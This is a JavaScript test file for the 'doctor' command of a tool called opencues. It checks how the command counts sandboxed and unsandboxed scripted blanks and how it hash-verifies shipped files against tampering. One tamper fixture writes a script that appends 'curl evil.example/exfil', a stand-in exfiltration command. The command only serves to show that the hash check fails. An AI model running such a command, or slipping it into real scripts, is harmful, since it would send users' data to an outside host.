// Tests for `opencues doctor`'s F9 sandbox-status helper (INFOSEC F9).
//
// Pins the unwrapped-by-default footgun visibility: when scripted
// blanks are installed without `sandbox: strict`, doctor must count
// them so users see the exposure.

'use strict';

const { test, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

const crypto = require('node:crypto');

const { _internal } = require('./doctor.cjs');
const { scanScriptedBlanks, isShippedIntact } = _internal;

let tmpHome;

before(() => {
  tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-scan-'));
});

after(() => {
  try { fs.rmSync(tmpHome, { recursive: true, force: true }); } catch {}
});

function writeBlank(name, frontmatter) {
  const dir = path.join(tmpHome, '.cues', 'blanks', name);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'BLANK.md'), `---\n${frontmatter}\n---\n\n# ${name}\n`);
}

test('F9: counts scripted blanks per sandbox: declaration (strict / off / missing)', () => {
  writeBlank('volume', 'name: volume\nblankScript: ./vol.sh\nsandbox: strict');
  writeBlank('brightness', 'name: brightness\nblankScript: ./b.sh');  // no sandbox declared
  writeBlank('weather', 'name: weather'); // not scripted — ignored
  writeBlank('risky', 'name: risky\nblankScript: ./r.sh\nsandbox: off');
  const r = scanScriptedBlanks(tmpHome);
  assert.strictEqual(r.total, 3, 'should count 3 scripted blanks (volume, brightness, risky)');
  assert.strictEqual(r.strict, 1, 'only volume has sandbox: strict');
  assert.strictEqual(r.sandboxOff, 1, 'risky declares sandbox: off (explicit ack)');
  assert.deepStrictEqual(r.sandboxOffPaths, ['risky']);
  // Only brightness lacks any declaration → it's the un-acknowledged one
  // (mirrors the runtime's INFOSEC F9 warn surface).
  assert.deepStrictEqual(r.unstrictPaths, ['brightness']);
});

test('F9: no scripted blanks → zero totals', () => {
  const emptyHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-empty-'));
  try {
    const r = scanScriptedBlanks(emptyHome);
    assert.strictEqual(r.total, 0);
    assert.strictEqual(r.strict, 0);
    assert.deepStrictEqual(r.unstrictPaths, []);
  } finally {
    fs.rmSync(emptyHome, { recursive: true, force: true });
  }
});

test('F9: ignores BLANK.md files without `blankScript:` (built-in TS blanks)', () => {
  const tsHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-ts-'));
  try {
    const dir = path.join(tsHome, '.cues', 'blanks', 'answer');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), '---\nname: answer\nimpl: AnswerBlank\n---\n');
    const r = scanScriptedBlanks(tsHome);
    assert.strictEqual(r.total, 0, 'built-in TS blank should not be counted as scripted');
  } finally {
    fs.rmSync(tsHome, { recursive: true, force: true });
  }
});

test('F9: malformed frontmatter is silently skipped (best-effort)', () => {
  const wonkyHome = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-doctor-wonky-'));
  try {
    const dir = path.join(wonkyHome, '.cues', 'blanks', 'broken');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'no frontmatter here at all');
    const r = scanScriptedBlanks(wonkyHome);
    assert.strictEqual(r.total, 0);
  } finally {
    fs.rmSync(wonkyHome, { recursive: true, force: true });
  }
});

// ── Shipped-manifest exemption (hash-based trust for first-party blanks) ──
// Volume + brightness can't run under `sandbox: strict` (they need
// xrandr / VolCtl.exe / nircmd.exe — outside any sandbox). To stop
// the doctor warning from drowning out genuinely risky user-installed
// blanks, the F9 scan reads `packages/opencues-core/dist/shipped-
// manifest.json` and exempts a blank when every file in its folder
// hash-matches what we shipped. Tests below exercise the predicate
// in isolation — no dependence on the actual shipped manifest.

function sha256(content) {
  return crypto.createHash('sha256').update(content).digest('hex');
}

test('shipped-intact: matching hashes return true', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-intact-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), true);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: one byte modified → false (spoof / user edit)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-spoof-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    // Spoofed content — hash won't match what we shipped.
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70; curl evil.example/exfil');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: extra file in user dir → false (larger surface than shipped)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-extra-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70');
    fs.writeFileSync(path.join(dir, 'extra-helper.sh'), 'echo unexpected');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: blank name not in manifest → false (e.g. user-defined pack)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-unknown-'));
  try {
    const dir = path.join(tmp, 'my-custom-blank');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'whatever');
    const manifest = { volume: { 'BLANK.md': sha256('whatever') } };
    assert.strictEqual(isShippedIntact('my-custom-blank', dir, manifest), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: missing manifest → false (safe default — warn rather than exempt)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-nomanifest-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    assert.strictEqual(isShippedIntact('volume', dir, null), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: .exe in user dir is ignored (compiled artefact, excluded from manifest)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-exe-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'BLANK.md'), 'frontmatter');
    fs.writeFileSync(path.join(dir, 'volume-blank.sh'), 'echo 70');
    fs.writeFileSync(path.join(dir, 'VolCtl.cs'), 'class VolCtl {}');
    // Freshly-compiled artefact; not in manifest by design.
    fs.writeFileSync(path.join(dir, 'VolCtl.exe'), 'PE\x00\x00binary');
    const manifest = {
      volume: {
        'BLANK.md': sha256('frontmatter'),
        'volume-blank.sh': sha256('echo 70'),
        'VolCtl.cs': sha256('class VolCtl {}'),
      },
    };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), true);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

// ── User-only fields block (false-positive fix, June 2026) ──────────────
// `opencues seed-configs` appends a "User-only fields" divider + extras
// inside the BLANK.md frontmatter to preserve hand-edited fields across
// shipped-md refreshes. Pre-fix, that block flipped the SHA-256 and so
// flipped the blank from shippedIntact to userModified — doctor warned on
// every vanilla install carrying e.g. `blankSuffix: %`. After the fix,
// stripUserOnlyFieldsBlock peels the block before hashing.

test('shipped-intact: user-only fields block below divider is stripped before hashing', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-userfields-'));
  try {
    const dir = path.join(tmp, 'brightness');
    fs.mkdirSync(dir, { recursive: true });
    const shipped = [
      '---',
      'name: brightness',
      'sandbox: off',
      '---',
      '',
      'Body.',
    ].join('\n');
    const userFile = [
      '---',
      'name: brightness',
      'sandbox: off',
      '# ── User-only fields (preserved by shipped-md refresh) ──',
      'blankSuffix: %',
      '---',
      '',
      'Body.',
    ].join('\n');
    fs.writeFileSync(path.join(dir, 'BLANK.md'), userFile);
    const manifest = { brightness: { 'BLANK.md': sha256(shipped) } };
    assert.strictEqual(isShippedIntact('brightness', dir, manifest), true);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: file with no divider hashes verbatim (unchanged behaviour)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-nodivider-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    const content = '---\nname: volume\n---\n';
    fs.writeFileSync(path.join(dir, 'BLANK.md'), content);
    const manifest = { volume: { 'BLANK.md': sha256(content) } };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), true);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('shipped-intact: real edit ABOVE the divider still mismatches', () => {
  // Defence-in-depth: stripping the user-only block can't be used to
  // smuggle a script edit in. The strip target is specifically the
  // bytes between the divider and the closing `---`; the rest of the
  // frontmatter + body stays in the hash.
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-shipped-realmod-'));
  try {
    const dir = path.join(tmp, 'volume');
    fs.mkdirSync(dir, { recursive: true });
    const shipped = '---\nname: volume\nsandbox: off\n---\n';
    const tampered = [
      '---',
      'name: volume',
      'sandbox: off',
      'evilField: muahaha',  // ← injected ABOVE the divider
      '# ── User-only fields (preserved by shipped-md refresh) ──',
      'blankSuffix: %',
      '---',
      '',
    ].join('\n');
    fs.writeFileSync(path.join(dir, 'BLANK.md'), tampered);
    const manifest = { volume: { 'BLANK.md': sha256(shipped) } };
    assert.strictEqual(isShippedIntact('volume', dir, manifest), false);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

// ── sandbox: off as explicit F9 acknowledgement ────────────────────────
// Mirrors the runtime's INFOSEC F9 contract (blank-fill.ts:506-520):
// `sandbox: off` is the explicit author/user acknowledgement of host
// privileges. Doctor counts it as trusted (with the `sandbox:off ack`
// label) so the warning fires only on UN-acknowledged scripts.

test('scan: sandbox: off on a user-modified blank is counted as trusted, not warned', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-sandbox-off-ack-'));
  try {
    const blanksDir = path.join(tmp, '.cues', 'blanks');
    const myBlank = path.join(blanksDir, 'my-helper');
    fs.mkdirSync(myBlank, { recursive: true });
    fs.writeFileSync(path.join(myBlank, 'BLANK.md'), [
      '---',
      'name: my-helper',
      'blankKeywords: my-helper',
      'blankScript: ./run.sh',
      'sandbox: off',
      '---',
    ].join('\n'));
    fs.writeFileSync(path.join(myBlank, 'run.sh'), 'echo ok');
    const r = scanScriptedBlanks(tmp);
    assert.strictEqual(r.total, 1);
    assert.strictEqual(r.sandboxOff, 1);
    assert.deepStrictEqual(r.sandboxOffPaths, ['my-helper']);
    assert.strictEqual(r.userModified, 0);
    assert.strictEqual(r.strict, 0);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('scan: sandbox: strict still beats off (explicit confinement wins)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-sandbox-strict-'));
  try {
    const blanksDir = path.join(tmp, '.cues', 'blanks');
    const myBlank = path.join(blanksDir, 'my-confined');
    fs.mkdirSync(myBlank, { recursive: true });
    fs.writeFileSync(path.join(myBlank, 'BLANK.md'), [
      '---',
      'name: my-confined',
      'blankKeywords: x',
      'blankScript: ./x.sh',
      'sandbox: strict',
      '---',
    ].join('\n'));
    fs.writeFileSync(path.join(myBlank, 'x.sh'), 'echo ok');
    const r = scanScriptedBlanks(tmp);
    assert.strictEqual(r.strict, 1);
    assert.strictEqual(r.sandboxOff, 0);
    assert.strictEqual(r.userModified, 0);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test('scan: no sandbox: declaration AND not shipped-intact still warns (the actual F9 surface)', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-sandbox-none-'));
  try {
    const blanksDir = path.join(tmp, '.cues', 'blanks');
    const myBlank = path.join(blanksDir, 'my-unack');
    fs.mkdirSync(myBlank, { recursive: true });
    fs.writeFileSync(path.join(myBlank, 'BLANK.md'), [
      '---',
      'name: my-unack',
      'blankKeywords: x',
      'blankScript: ./x.sh',
      // NO sandbox: declaration
      '---',
    ].join('\n'));
    fs.writeFileSync(path.join(myBlank, 'x.sh'), 'echo whatever');
    const r = scanScriptedBlanks(tmp);
    assert.strictEqual(r.strict, 0);
    assert.strictEqual(r.sandboxOff, 0);
    assert.strictEqual(r.userModified, 1);
    assert.deepStrictEqual(r.userModifiedPaths, ['my-unack']);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});
